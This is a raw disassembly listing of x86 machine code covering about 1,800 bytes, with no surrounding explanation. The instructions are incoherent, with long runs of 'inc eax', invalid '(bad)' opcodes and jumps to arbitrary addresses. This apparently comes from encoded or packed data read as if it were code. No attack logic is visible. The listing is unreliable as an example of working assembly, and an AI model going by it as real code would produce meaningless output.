  407514:	ret    
  407515:	xor    al,0xa7
  407517:	inc    ecx
  407518:	sub    eax,0xbc93ec57
  40751d:	outs   dx,BYTE PTR ds:[esi]
  40751e:	(bad)  
  40751f:	mov    ds:0xab63780c,eax
  407524:	inc    ecx
  407525:	ds dec eax
  407527:	push   esi
  407528:	inc    eax
  407529:	push   ebp
  40752a:	mov    al,ds:0x564c5241
  40752f:	arpl   WORD PTR [ecx],di
  407531:	mov    DWORD PTR [eax+0x40],eax
  407534:	inc    eax
  407535:	inc    eax
  407536:	inc    eax
  407537:	inc    eax
  407538:	inc    eax
  407539:	inc    eax
  40753a:	inc    eax
  40753b:	inc    eax
  40753c:	sub    al,cl
  40753e:	sub    al,0x4b
  407540:	pop    esp
  407541:	ins    BYTE PTR es:[edi],dx
  407542:	inc    eax
  407543:	cmp    BYTE PTR [ecx],dh
  407545:	mov    esp,0xe14ec152
  40754a:	xor    bh,BYTE PTR [ebp+0x52780d04]
  407550:	inc    eax
  407551:	inc    eax
  407552:	inc    eax
  407553:	inc    eax
  407554:	inc    eax
  407555:	inc    eax
  407556:	inc    eax
  407557:	inc    eax
  407558:	add    BYTE PTR [eax+ebx*1+0x433462e8],dl
  40755f:	mov    BYTE PTR [ebx-0x5e],cl
  407562:	in     eax,0x40
  407564:	jnp    0x407525
  407566:	mov    ah,0x53
  407568:	rol    DWORD PTR [edx],0xda
  40756b:	and    DWORD PTR [eax+edi*4],esp
  40756e:	or     eax,0x4040e3c1
  407573:	inc    eax
  407574:	inc    eax
  407575:	inc    eax
  407576:	inc    eax
  407577:	and    eax,0x4b404040
  40757c:	mov    ds:0xcbc3da44,eax
  407581:	ja     0x40751b
  407583:	adc    eax,ebp
  407585:	inc    eax
  407586:	adc    dl,BYTE PTR [ecx-0x3a9feabc]
  40758c:	arpl   WORD PTR [ebx],si
  40758e:	xor    DWORD PTR [ebx-0x7c],eax
  407591:	bound  ebp,QWORD PTR [edx+ecx*4+0x4c2c5841]
  407598:	ret    
  407599:	xor    eax,0x4021a3c3
  40759e:	sbb    al,0xd0
  4075a0:	inc    eax
  4075a1:	inc    eax
  4075a2:	inc    eax
  4075a3:	inc    eax
  4075a4:	inc    eax
  4075a5:	inc    eax
  4075a6:	inc    eax
  4075a7:	inc    eax
  4075a8:	inc    eax
  4075a9:	inc    eax
  4075aa:	inc    eax
  4075ab:	add    BYTE PTR [ecx-0x59],cl
  4075ae:	inc    edi
  4075af:	and    ebp,DWORD PTR [edx-0x38]
  4075b2:	inc    eax
  4075b3:	mov    al,ds:0x6821c53f
  4075b8:	xor    al,0x43
  4075ba:	dec    eax
  4075bb:	ret    
  4075bc:	jecxz  0x407599
  4075be:	mov    edi,0x7f295f40
  4075c3:	mov    esp,0x40174038
  4075c8:	inc    eax
  4075c9:	inc    eax
  4075ca:	inc    eax
  4075cb:	inc    eax
  4075cc:	inc    eax
  4075cd:	rol    DWORD PTR [eax+0x40],0x2e
  4075d1:	cmp    DWORD PTR [esi+0x604105a8],ecx
  4075d7:	and    eax,0x12af166a
  4075dc:	retf   
  4075dd:	hlt    
  4075de:	inc    eax
  4075df:	jb     0x407621
  4075e1:	inc    eax
  4075e2:	add    BYTE PTR [eax+0x40],al
  4075e5:	inc    eax
  4075e6:	inc    eax
  4075e7:	inc    eax
  4075e8:	inc    eax
  4075e9:	js     0x407584
  4075eb:	fst    QWORD PTR [ecx+0x77]
  4075ee:	enter  0xa940,0x42
  4075f2:	cmp    eax,0xae45f6c5
  4075f7:	inc    eax
  4075f8:	pop    esi
  4075f9:	sub    BYTE PTR [edx+0x30],ah
  4075fc:	dec    edi
  4075fd:	push   ebx
  4075fe:	leave  
  4075ff:	push   eax
  407600:	loope  0x4075d2
  407602:	adc    al,BYTE PTR [edx-0x44]
  407605:	sub    al,0x9a
  407607:	inc    eax
  407608:	cmp    DWORD PTR [edx-0x38],eax
  40760b:	sub    al,BYTE PTR [eax+0x40]
  40760e:	inc    eax
  40760f:	inc    eax
  407610:	inc    eax
  407611:	inc    eax
  407612:	inc    eax
  407613:	inc    eax
  407614:	inc    eax
  407615:	inc    eax
  407616:	or     eax,0xad40ab61
  40761b:	and    eax,0xc443205e
  407620:	inc    esp
  407621:	inc    eax
  407622:	push   esi
  407623:	inc    eax
  407624:	ins    BYTE PTR es:[edi],dx
  407625:	xor    al,0x48
  407627:	mov    cl,0x55
  407629:	push   eax
  40762a:	popa   
  40762b:	sub    edx,DWORD PTR [edi-0x80]
  40762e:	or     eax,0x4d40cfa8
  407633:	inc    eax
  407634:	inc    ebx
  407635:	lds    eax,FWORD PTR [eax+0x40]
  407638:	inc    eax
  407639:	inc    eax
  40763a:	inc    eax
  40763b:	inc    eax
  40763c:	int3   
  40763d:	jne    0x40767f
  40763f:	retf   
  407640:	pop    ebp
  407641:	(bad)  
  407642:	inc    eax
  407643:	pusha  
  407644:	and    esp,esp
  407646:	xchg   edx,eax
  407647:	pop    esp
  407648:	and    ch,BYTE PTR [eax-0xe1ff7c0]
  40764e:	inc    esp
  40764f:	cmp    eax,0x231011cb
  407654:	jo     0x4075fe
  407656:	and    BYTE PTR [eax-0x5cbfbba4],bh
  40765c:	inc    eax
  40765d:	ror    eax,cl
  40765f:	add    eax,0xbd409062
  407664:	pusha  
  407665:	ss inc eax
  407667:	add    cl,al
  407669:	inc    eax
  40766a:	inc    eax
  40766b:	inc    eax
  40766c:	inc    eax
  40766d:	add    BYTE PTR [eax+0x7d],al
  407670:	jnp    0x407667
  407672:	or     al,0x40
  407674:	cmovo  esp,DWORD PTR [edx+0x38]
  407678:	mov    esp,0x2810cb0c
  40767d:	xor    al,0x64
  40767f:	inc    esp
  407680:	add    eax,0x26404867
  407685:	inc    eax
  407686:	sbb    al,0xa9
  407688:	retf   
  407689:	push   0x40
  40768b:	inc    eax
  40768c:	inc    eax
  40768d:	inc    eax
  40768e:	inc    eax
  40768f:	inc    eax
  407690:	inc    eax
  407691:	inc    eax
  407692:	inc    DWORD PTR [eax+0x45]
  407695:	inc    eax
  407696:	inc    edi
  407697:	das    
  407698:	pop    esp
  407699:	test   al,0x5e
  40769b:	fcomp  QWORD PTR [ecx+0xd402241]
  4076a1:	adc    DWORD PTR [eax+0x67],eax
  4076a4:	test   al,dl
  4076a6:	sub    ch,BYTE PTR [esi]
  4076a8:	test   al,0xb8
  4076aa:	inc    edx
  4076ab:	arpl   WORD PTR es:[eax+0x8],ax
  4076af:	rol    BYTE PTR [eax+0x40],0x40
  4076b3:	inc    eax
  4076b4:	inc    eax
  4076b5:	inc    eax
  4076b6:	inc    eax
  4076b7:	inc    eax
  4076b8:	inc    eax
  4076b9:	inc    eax
  4076ba:	adc    BYTE PTR [edx-0x38],al
  4076bd:	les    edx,FWORD PTR [ebp+0x40]
  4076c0:	and    ch,dh
  4076c2:	inc    edx
  4076c3:	popa   
  4076c4:	bound  esi,QWORD PTR [bp+di]
  4076c7:	inc    eax
  4076c8:	xor    edi,DWORD PTR [ebx+0x41]
  4076cb:	hlt    
  4076cc:	dec    ecx
  4076cd:	les    ecx,FWORD PTR [eax+eax*2+0x40]
  4076d1:	dec    edx
  4076d2:	pop    ss
  4076d3:	gs stos DWORD PTR es:[edi],eax
  4076d5:	dec    edi
  4076d6:	or     eax,0x80f5a240
  4076db:	test   BYTE PTR [esi+0x49],dl
  4076de:	jnp    0x4076b1
  4076e0:	inc    eax
  4076e1:	inc    eax
  4076e2:	inc    eax
  4076e3:	inc    eax
  4076e4:	inc    eax
  4076e5:	inc    eax
  4076e6:	inc    eax
  4076e7:	inc    eax
  4076e8:	add    BYTE PTR [edi+ebx*2],ah
  4076eb:	bound  edx,QWORD PTR ds:0x40bc228e
  4076f1:	jmp    0x4349:0x5cb4bd7
  4076f8:	inc    eax
  4076f9:	outs   dx,DWORD PTR ds:[esi]
  4076fa:	inc    ebx
  4076fb:	int3   
  4076fc:	stc    
  4076fd:	xor    al,0x40
  4076ff:	inc    eax
  407700:	inc    eax
  407701:	inc    eax
  407702:	inc    eax
  407703:	inc    eax
  407704:	and    eax,0xfc404040
  407709:	cdq    
  40770a:	inc    eax
  40770b:	and    bl,BYTE PTR [ebp*2-0x47ba83d5]
  407712:	aas    
  407713:	das    
  407714:	jae    0x4076a1
  407716:	inc    eax
  407717:	xchg   BYTE PTR [eax],ch
  407719:	bound  eax,QWORD PTR [eax+0x42]
  40771c:	dec    ebx
  40771d:	mov    al,ds:0xc96b442a
  407722:	inc    eax
  407723:	and    BYTE PTR [ecx+0x4a],dh
  407726:	test   BYTE PTR [edx-0x5],ch
  407729:	inc    ecx
  40772a:	inc    eax
  40772b:	adc    DWORD PTR [eax+0x40],esi
  40772e:	inc    eax
  40772f:	inc    eax
  407730:	inc    eax
  407731:	inc    eax
  407732:	inc    eax
  407733:	inc    eax
  407734:	inc    eax
  407735:	inc    eax
  407736:	inc    eax
  407737:	bound  eax,QWORD PTR ds:0x3c80d425
  40773d:	and    eax,0xfac91df7
  407742:	fs ret 
  407744:	inc    eax
  407745:	sub    edi,DWORD PTR [edi+0x8]
  407748:	nop
  407749:	and    al,0x2e
  40774b:	mov    esp,0x403f4440
  407750:	inc    eax
  407751:	inc    eax
  407752:	inc    eax
  407753:	inc    eax
  407754:	inc    eax
  407755:	rol    DWORD PTR [eax+0x40],0x62
  407759:	add    eax,0x400530a8
  40775e:	popa   
  40775f:	jg     0x4077d1
  407761:	retf   
  407762:	adc    DWORD PTR [edi-0x35],ecx
  407765:	cs pusha 
  407767:	aas    
  407768:	push   ds
  407769:	nop
  40776a:	mov    eax,0x61404934
  40776f:	jg     0x407706
  407771:	inc    esi
  407772:	or     eax,0x6340abc6
  407777:	aas    
  407778:	bound  ebp,QWORD PTR [ebx+ecx*8-0x32]
  40777c:	inc    esi
  40777d:	inc    eax
  40777e:	inc    eax
  40777f:	add    BYTE PTR [eax+0x40],al
  407782:	inc    eax
  407783:	inc    eax
  407784:	inc    eax
  407785:	inc    eax
  407786:	inc    eax
  407787:	mov    ds:0x1a28417f,al
  40778c:	bound  ebp,QWORD PTR [edi+0x4]
  40778f:	out    dx,eax
  407790:	aas    
  407791:	cmp    al,0x63
  407793:	xor    al,0x95
  407795:	test   BYTE PTR [eax+0x29],al
  407798:	inc    edi
  407799:	ja     0x4077ef
  40779b:	inc    eax
  40779c:	je     0x407819
  40779e:	inc    eax
  40779f:	xor    ebx,edi
  4077a1:	mov    eax,0xb62b86c
  4077a6:	inc    eax
  4077a7:	loop   0x407768
  4077a9:	inc    eax
  4077aa:	inc    eax
  4077ab:	inc    eax
  4077ac:	inc    eax
  4077ad:	inc    eax
  4077ae:	inc    eax
  4077af:	inc    eax
  4077b0:	inc    eax
  4077b1:	inc    eax
  4077b2:	inc    eax
  4077b3:	or     eax,0xcd493d29
  4077b8:	inc    eax
  4077b9:	das    
  4077ba:	dec    eax
  4077bb:	jnp    0x40781f
  4077bd:	ret    
  4077be:	les    eax,FWORD PTR [ecx]
  4077c0:	xlat   BYTE PTR ds:[ebx]
  4077c1:	push   cs
  4077c2:	pop    edi
  4077c3:	inc    ecx
  4077c4:	nop
  4077c5:	mov    eax,0x25a26c93
  4077ca:	jg     0x4077ff
  4077cc:	or     eax,0xe7d9a805
  4077d1:	push   ebp
  4077d2:	aas    
  4077d3:	lds    eax,FWORD PTR [eax+0x40]
  4077d6:	inc    eax
  4077d7:	inc    eax
  4077d8:	inc    eax
  4077d9:	inc    eax
  4077da:	int3   
  4077db:	jne    0x40781d
  4077dd:	leave  
  4077de:	leave  
  4077df:	adc    ah,ch
  4077e1:	xor    eax,0xa84c40a1
  4077e6:	inc    esp
  4077e7:	push   ecx
  4077e8:	fsubr  QWORD PTR ds:0xd41d30e
  4077ee:	inc    eax
  4077ef:	add    cl,al
  4077f1:	inc    eax
  4077f2:	inc    eax
  4077f3:	inc    eax
  4077f4:	inc    eax
  4077f5:	add    BYTE PTR [eax+0x4e],al
  4077f8:	inc    ecx
  4077f9:	ins    DWORD PTR es:[edi],dx
  4077fa:	mov    fs,WORD PTR ds:0x67cb3e5b
  407800:	(bad)  
  407801:	clc    
  407802:	xor    DWORD PTR [eax+0x51],0xd4d04868
  407809:	bound  eax,QWORD PTR [eax+0x40]
  40780c:	inc    eax
  40780d:	inc    eax
  40780e:	inc    eax
  40780f:	inc    eax
  407810:	inc    eax
  407811:	inc    eax
  407812:	inc    DWORD PTR [eax+0x77]
  407815:	and    ebp,DWORD PTR [edi]
  407817:	xor    al,0x33
  407819:	sub    DWORD PTR [edx+0x42],esp
  40781c:	push   edx
  40781d:	and    edi,ebp
  40781f:	inc    ecx
  407820:	test   al,0x72
  407822:	pop    edi
  407823:	call   0x3d415bfc
  407828:	add    eax,0x647c30c1
  40782d:	pop    ds
  40782e:	pop    ds
  40782f:	inc    eax
  407830:	inc    eax
  407831:	inc    eax
  407832:	inc    eax
  407833:	inc    eax
  407834:	inc    eax
  407835:	inc    eax
  407836:	inc    eax
  407837:	inc    eax
  407838:	inc    eax
  407839:	jle    0x4078b4
  40783b:	xor    ch,BYTE PTR [ebp+0x50]
  40783e:	sub    ah,BYTE PTR [ebx+0x0]
  407841:	push   eax
  407842:	mov    esp,0x96a877ab
  407847:	mov    eax,ds:0xb005b71f
  40784c:	dec    ecx
  40784d:	inc    eax
  40784e:	inc    eax
  40784f:	inc    eax
  407850:	inc    eax
  407851:	inc    eax
  407852:	inc    eax
  407853:	inc    eax
  407854:	inc    eax
  407855:	add    BYTE PTR [edx],dl
  407857:	fld    DWORD PTR [ecx+eax*2]
  40785a:	inc    ecx
  40785b:	imul   esp,DWORD PTR [ecx+0x53],0x59
  40785f:	outs   dx,DWORD PTR ds:[esi]
  407860:	daa    
  407861:	(bad)  
  407862:	ds push esp
  407864:	daa    
  407865:	pusha  
  407866:	daa    
  407867:	ret    
  407868:	dec    edi
  407869:	mov    edi,0x40400573
  40786e:	inc    eax
  40786f:	inc    eax
  407870:	inc    eax
  407871:	inc    eax
  407872:	and    eax,0x61404040
  407877:	mov    al,ds:0xa12b42
  40787c:	test   al,0xcb
  40787e:	cmp    al,0x65
  407880:	call   0xa85f8ac4
  407885:	dec    esi
  407886:	inc    esi
  407887:	jno    0x4078f0
  407889:	imul   esp,DWORD PTR [eax],0x4e3d7377
  40788f:	cmp    al,0x90
  407891:	push   0x7c411f2f
  407896:	lds    eax,FWORD PTR [edi+0x55]
  407899:	outs   dx,DWORD PTR ds:[esi]
  40789a:	inc    eax
  40789b:	inc    eax
  40789c:	inc    eax
  40789d:	inc    eax
  40789e:	inc    eax
  40789f:	inc    eax
  4078a0:	inc    eax
  4078a1:	inc    eax
  4078a2:	inc    eax
  4078a3:	inc    eax
  4078a4:	inc    esp
  4078a5:	add    BYTE PTR [edx+eiz*2],bh
  4078a8:	jb     0x40782a
  4078aa:	leave  
  4078ab:	loope  0x40784e
  4078ad:	pop    ds
  4078ae:	(bad)
  4078b1:	dec    eax
  4078b2:	rcr    cl,0x2b
  4078b5:	inc    eax
  4078b6:	inc    eax
  4078b7:	inc    eax
  4078b8:	inc    eax
  4078b9:	inc    eax
  4078ba:	inc    eax
  4078bb:	rol    DWORD PTR [eax+0x40],0x6a
  4078bf:	dec    esp
  4078c0:	dec    edi
  4078c1:	mov    al,0x71
  4078c3:	push   ebp
  4078c4:	shl    DWORD PTR [ecx],0xf9
  4078c7:	cdq    
  4078c8:	mov    edi,0x8729dd05
  4078cd:	jbe    0x407935
  4078cf:	cs mov eax,0x8a6b3d87
  4078d5:	and    eax,0x4040f7
  4078da:	inc    eax
  4078db:	inc    eax
  4078dc:	inc    eax
  4078dd:	inc    eax
  4078de:	inc    eax
  4078df:	inc    eax
  4078e0:	push   edx
  4078e1:	ret    
  4078e2:	push   eax
  4078e3:	sub    BYTE PTR [eax-0x439648da],0x92
  4078ea:	inc    ecx
  4078eb:	ins    BYTE PTR es:[edi],dx
  4078ec:	adc    ah,BYTE PTR [edi+eiz*1-0x65]
  4078f0:	add    eax,0xbf1d61bf
  4078f5:	scas   al,BYTE PTR es:[edi]
  4078f6:	xchg   DWORD PTR [ecx-0x58],ecx
  4078f9:	inc    esp
  4078fa:	inc    eax
  4078fb:	inc    eax
  4078fc:	inc    eax
  4078fd:	inc    eax
  4078fe:	inc    eax
  4078ff:	inc    eax
  407900:	inc    eax
  407901:	inc    eax
  407902:	inc    eax
  407903:	inc    eax
  407904:	fmul   QWORD PTR [eax-0x28f95bb6]
  40790a:	stos   BYTE PTR es:[edi],al
  40790b:	push   es
  40790c:	dec    esi
  40790d:	bound  edx,QWORD PTR [edx+edi*8]
  407910:	sub    DWORD PTR [esi+0x64],edx
  407913:	add    ah,cl
  407915:	leave  
  407916:	int    0xac
  407918:	add    bl,BYTE PTR [ebp-0x49]
  40791b:	bound  eax,QWORD PTR [edi+0x68]
  40791e:	dec    eax
  40791f:	sub    eax,0x40404081
  407924:	inc    eax
  407925:	inc    eax
  407926:	inc    eax
  407927:	int3   
  407928:	jne    0x40796a
  40792a:	mov    edi,0x71a84f68
  40792f:	retf   
  407930:	sbb    DWORD PTR [ebp+eax*1-0x2b],esi
  407934:	enter  0x626b,0x48
  407938:	adc    DWORD PTR fs:[ecx],0x40737c
  40793f:	rol    DWORD PTR [eax+0x40],0x40
  407943:	inc    eax
  407944:	add    BYTE PTR [eax+0x43],al
  407947:	push   ecx
  407948:	inc    edi
  407949:	pop    es
  40794a:	dec    ebp
  40794b:	jmp    0x3c612191
  407950:	pop    esi
  407951:	mov    ds:0x119eb181,eax
  407956:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407957:	push   edi
  407958:	adc    bh,0x40
  40795b:	inc    eax
  40795c:	inc    eax
  40795d:	inc    eax
  40795e:	inc    eax
  40795f:	inc    eax
  407960:	inc    eax
  407961:	inc    eax
  407962:	inc    DWORD PTR [eax+0x76]
  407965:	int    0x18
  407967:	lahf   
  407968:	stos   DWORD PTR es:[edi],eax
  407969:	rcl    BYTE PTR [eax],0xe1
  40796c:	adc    DWORD PTR ds:0xcdbc0b62,0x49470ab0
  407976:	test   al,0x62
  407978:	add    eax,0x2f05c0
  40797d:	cdq    
  40797e:	les    ebx,FWORD PTR [eax+0x40cd51c9]
  407984:	inc    eax
  407985:	inc    eax
  407986:	inc    eax
  407987:	inc    eax
  407988:	inc    eax
  407989:	inc    eax
  40798a:	inc    eax
  40798b:	inc    eax
  40798c:	inc    eax
  40798d:	xchg   ebx,eax
  40798e:	xor    edx,DWORD PTR [esi+edx*2]
  407991:	aaa    
  407992:	inc    ecx
  407993:	adc    dl,BYTE PTR fs:[esi+edi*4+0x77]
  407998:	js     0x4079d7
  40799a:	cmp    BYTE PTR [eax+eax*2+0x40404040],0x40
  4079a2:	inc    eax
  4079a3:	inc    eax
  4079a4:	add    BYTE PTR [eax+0x2e],dl
  4079a7:	dec    ecx
  4079a8:	pusha  
  4079a9:	pop    esp
  4079aa:	dec    ebx
  4079ab:	ret    
  4079ac:	int3   
  4079ad:	adc    eax,0x68f70103
  4079b2:	inc    esp
  4079b3:	mov    esp,0xd3e7cb2d
  4079b8:	pop    ebx
  4079b9:	mov    eax,0x4553056a
  4079be:	dec    esp
  4079bf:	or     bl,BYTE PTR [ecx+0x40404040]
  4079c5:	inc    eax
  4079c6:	inc    eax
  4079c7:	and    eax,0x67404040
  4079cc:	fwait
  4079cd:	retf   
  4079ce:	adc    BYTE PTR [esi+0x2c],0x2e
  4079d2:	push   ebx
  4079d3:	add    esp,0xf1bc614b
  4079d9:	add    eax,0x344f5137
  4079de:	mov    esp,0xbf938524
  4079e3:	outs   dx,DWORD PTR ds:[esi]
  4079e4:	push   esp
  4079e5:	xchg   edx,eax
  4079e6:	push   0x45e34c42
  4079eb:	std    
  4079ec:	inc    ecx
  4079ed:	lds    esi,FWORD PTR [ecx+0x4040409d]
  4079f3:	inc    eax
  4079f4:	inc    eax
  4079f5:	inc    eax
  4079f6:	inc    eax
  4079f7:	inc    eax
  4079f8:	inc    eax
  4079f9:	inc    eax
  4079fa:	bound  eax,QWORD PTR [edi]
  4079fc:	aad    0x8
  4079fe:	mov    ds:0xa4693c01,eax
  407a03:	ss jp  0x407998
  407a06:	enter  0xdb54,0x1a
  407a0a:	inc    eax
  407a0b:	inc    eax
  407a0c:	inc    eax
  407a0d:	inc    eax
  407a0e:	inc    eax
  407a0f:	inc    eax
  407a10:	rol    DWORD PTR [eax+0x40],0xd
  407a14:	mov    DWORD PTR ds:0xf8f763b1,edx
  407a1a:	push   esi
  407a1b:	bound  esi,QWORD PTR [ebx+0x51]
  407a1e:	bound  edx,QWORD PTR ds:0x403d6c4f
  407a24:	xchg   DWORD PTR [edi-0x4bb727cb],edi
  407a2a:	dec    ebx
  407a2b:	std    
  407a2c:	xor    eax,0x404006
  407a31:	inc    eax
  407a32:	inc    eax
  407a33:	inc    eax
  407a34:	inc    eax
  407a35:	inc    eax
  407a36:	inc    eax
  407a37:	jno    0x407a8b
  407a39:	or     eax,0x81422005
  407a3e:	jne    0x407a7d
  407a40:	rol    BYTE PTR [ebx-0x37],0x7f
  407a44:	out    0x9f,al
  407a46:	dec    ax
  407a48:	addr16 inc eax
  407a4a:	push   0xffffffb2
  407a4c:	fild   QWORD PTR [eax+0x71]
  407a4f:	push   cs
  407a50:	inc    eax
  407a51:	inc    eax
  407a52:	inc    eax
  407a53:	inc    eax
  407a54:	inc    eax
  407a55:	inc    eax
  407a56:	inc    eax
  407a57:	inc    eax
  407a58:	inc    eax
  407a59:	inc    eax
  407a5a:	sbb    eax,DWORD PTR [edx+0xf]
  407a5d:	cld    
  407a5e:	add    DWORD PTR [esp+edi*2],0xffffffbd
  407a62:	xchg   esp,eax
  407a63:	cmp    al,0x62
  407a65:	div    BYTE PTR [ebp+0xc]
  407a68:	adc    ah,BYTE PTR [ebx-0x3]
  407a6b:	pop    ecx
  407a6c:	test   BYTE PTR [esi+ebx*8+0x7e],ah
  407a70:	xor    BYTE PTR [edi+0x43c34094],ah
  407a76:	bound  eax,QWORD PTR [eax+0x40]
  407a79:	inc    eax
  407a7a:	inc    eax
  407a7b:	inc    eax
  407a7c:	inc    eax
  407a7d:	int3   
  407a7e:	jne    0x407ac0
  407a80:	add    al,0x61
  407a82:	adc    al,0x98
  407a84:	std    
  407a85:	(bad)  
  407a86:	push   ecx
  407a87:	mov    ebx,0xd6db334
  407a8c:	imul   edi,edx,0x4
  407a8f:	pop    ds
  407a90:	adc    eax,0x5dc97ebd
  407a95:	(bad)  
  407a96:	int    0x3f
  407a98:	add    DWORD PTR [eax+0x78],esp
  407a9b:	push   eax
  407a9c:	pushf  
  407a9d:	test   al,0x40
  407a9f:	add    cl,al
  407aa1:	inc    eax
  407aa2:	inc    eax
  407aa3:	inc    eax
  407aa4:	inc    eax
  407aa5:	add    BYTE PTR [eax-0x48],al
  407aa8:	leave  
  407aa9:	jae    0x407b1c
  407aab:	bound  eax,QWORD PTR [ecx-0x44]
  407aae:	adc    dl,BYTE PTR ds:0xa96b01ac
  407ab4:	cmp    al,0x5
  407ab6:	dec    eax
  407ab7:	retf   
  407ab8:	fadd   DWORD PTR [esi-0xd]
  407abb:	inc    edi
  407abc:	sub    bl,cl
  407abe:	gs inc eax
  407ac0:	inc    eax
  407ac1:	inc    eax
  407ac2:	inc    eax
  407ac3:	inc    eax
  407ac4:	inc    eax
  407ac5:	inc    eax
  407ac6:	inc    eax
  407ac7:	inc    DWORD PTR [eax+0x48]
  407aca:	jmp    0x407a4e
  407acc:	push   ecx
  407acd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407ace:	inc    edx
  407acf:	test   al,0xb7
  407ad1:	retf   
  407ad2:	jle    0x407add
  407ad4:	test   DWORD PTR [edx],0x4062ab08
  407ada:	inc    eax
  407adb:	inc    eax
  407adc:	inc    eax
  407add:	inc    eax
  407ade:	inc    eax
  407adf:	inc    eax
  407ae0:	inc    eax
  407ae1:	inc    eax
  407ae2:	inc    eax
  407ae3:	dec    esp
  407ae4:	push   esi
  407ae5:	out    dx,al
  407ae6:	(bad)  
  407ae7:	les    edi,FWORD PTR fs:[eax+esi*2+0x7f40d747]
  407aef:	inc    edx
  407af0:	dec    edi
  407af1:	adc    eax,0x4040405d
  407af6:	inc    eax
  407af7:	inc    eax
  407af8:	inc    eax
  407af9:	inc    eax
  407afa:	inc    eax
  407afb:	add    BYTE PTR [eax-0x2a],bl
  407afe:	pusha  
  407aff:	js     0x407add
  407b01:	inc    ecx
  407b02:	leave  
  407b03:	sub    eax,ebx
  407b05:	sbb    eax,0x2c64f3c8
  407b0a:	inc    ecx
  407b0b:	rol    DWORD PTR [eax+0x40],cl
  407b0e:	inc    eax
  407b0f:	inc    eax
  407b10:	inc    eax
  407b11:	inc    eax
  407b12:	and    eax,0x68404040
  407b17:	jecxz  0x407b1b
  407b19:	xor    eax,0x96823c4f
  407b1e:	mov    eax,0xdd552595
  407b23:	lods   al,BYTE PTR ds:[esi]
  407b24:	inc    eax
  407b25:	inc    eax
  407b26:	inc    eax
  407b27:	inc    eax
  407b28:	inc    eax
  407b29:	inc    eax
  407b2a:	inc    eax
  407b2b:	inc    eax
  407b2c:	inc    eax
  407b2d:	inc    eax
  407b2e:	ret    
  407b2f:	test   al,0xf5
  407b31:	dec    esi
  407b32:	gs pop eax
  407b34:	dec    ebx
  407b35:	add    eax,0xc7da2ebc
  407b3a:	xor    esp,0x32
  407b3d:	leave  
  407b3e:	adc    eax,0x497bc13f
  407b43:	add    al,0x40
  407b45:	inc    eax
  407b46:	inc    eax
  407b47:	inc    eax
  407b48:	inc    eax
  407b49:	inc    eax
  407b4a:	rol    DWORD PTR [eax+0x40],0x42
  407b4e:	pop    ebp
  407b4f:	retf   
  407b50:	ret    0x4742
  407b53:	cmp    DWORD PTR [esi+0x144bdf3e],0x40f46ebd
  407b5d:	push   ebp
  407b5e:	das    
  407b5f:	xor    al,0x62
  407b61:	jnp    0x407bde
  407b63:	adc    DWORD PTR [ebx+edi*2-0x77],0xffffff89
  407b68:	outs   dx,BYTE PTR ds:[esi]
  407b69:	jne    0x407b15
  407b6b:	dec    edx
  407b6c:	push   eax
  407b6d:	mov    esp,0x4040a8
  407b72:	inc    eax
  407b73:	inc    eax
  407b74:	inc    eax
  407b75:	inc    eax
  407b76:	inc    eax
  407b77:	inc    eax
  407b78:	lds    ebx,FWORD PTR [esp+ecx*2+0x32]
  407b7c:	add    bh,BYTE PTR [edi]
  407b7e:	lahf   
  407b7f:	adc    BYTE PTR [eax+0x62],cl
  407b82:	outs   dx,DWORD PTR ds:[esi]
  407b83:	mov    ebp,DWORD PTR [edi+0x50]
  407b86:	sub    ebp,DWORD PTR [eax+0x407856fe]
  407b8c:	inc    eax
  407b8d:	inc    eax
  407b8e:	inc    eax
  407b8f:	inc    eax
  407b90:	inc    eax
  407b91:	inc    eax
  407b92:	inc    eax
  407b93:	inc    eax
  407b94:	inc    eax
  407b95:	jb     0x407bc5
  407b97:	aas    
  407b98:	bound  eax,QWORD PTR ds:0x6e4374f
  407b9e:	gs xor al,0x48
  407ba1:	inc    ebx
  407ba2:	mov    esp,0x40a862b0
  407ba7:	inc    eax
  407ba8:	inc    eax
  407ba9:	inc    eax
  407baa:	inc    eax
  407bab:	inc    eax
  407bac:	int3   
  407bad:	jne    0x407bef
  407baf:	add    dl,BYTE PTR [edi+0x44]
  407bb2:	add    ax,0x4c05
  407bb6:	pop    edx
  407bb7:	cmp    DWORD PTR [ecx+0x29],esi
  407bba:	hlt    
  407bbb:	inc    ebx
  407bbc:	jnp    0x407bcb
  407bbe:	test   eax,0x6260ea42
  407bc3:	dec    eax
  407bc4:	mov    esp,0xc10040cb
  407bc9:	inc    eax
  407bca:	inc    eax
  407bcb:	inc    eax
  407bcc:	inc    eax
  407bcd:	add    BYTE PTR [eax-0x18],al
  407bd0:	add    BYTE PTR [esi+0x505404c],dl
  407bd6:	inc    esp
  407bd7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407bd8:	sub    eax,0xcba8fd09
  407bdd:	retf   
  407bde:	inc    ecx
  407bdf:	cmp    eax,edi
  407be1:	inc    edi
  407be2:	inc    esp
  407be3:	jl     0x407c3d
  407be5:	jo     0x407c32
  407be7:	test   DWORD PTR [edx],ecx
  407be9:	mov    bh,0x24
  407beb:	mov    ds:0x5e38464a,al
  407bf0:	mov    al,ds:0x40634cad
  407bf5:	push   ebp
  407bf6:	inc    eax
  407bf7:	inc    eax
  407bf8:	inc    eax
  407bf9:	inc    eax
  407bfa:	inc    eax
  407bfb:	inc    eax
  407bfc:	inc    eax
  407bfd:	inc    eax
  407bfe:	inc    DWORD PTR [eax-0x3a]
  407c01:	sbb    dl,BYTE PTR [edx+0x5a]
  407c04:	dec    esp
  407c05:	sub    BYTE PTR [ecx-0x3c],dh
  407c08:	sti    
  407c09:	mov    eax,DWORD PTR [ecx]
  407c0b:	push   ecx
  407c0c:	popf   
  407c0d:	(bad)  
  407c0e:	aam    0x67
  407c10:	test   al,0x40
  407c12:	inc    eax
  407c13:	inc    eax
  407c14:	inc    eax
  407c15:	inc    eax
  407c16:	inc    eax
  407c17:	inc    eax
  407c18:	inc    eax
  407c19:	inc    eax
  407c1a:	inc    eax
  407c1b:	bound  edx,QWORD PTR ds:0x4f4f404e
  407c21:	mov    bh,0x10
  407c23:	pop    es
  407c24:	int    0xb0
  407c26:	sbb    BYTE PTR [eax-0x64],al
  407c29:	rol    BYTE PTR [edx+0x7f],1
  407c2c:	and    BYTE PTR [eax+0x67],0x88
  407c30:	adc    DWORD PTR [ebx-0x16d21d35],ebp
  407c36:	jns    0x407c75
  407c38:	inc    esi
  407c39:	push   edx
  407c3a:	dec    eax
  407c3b:	rcl    DWORD PTR [edi+0x53],1
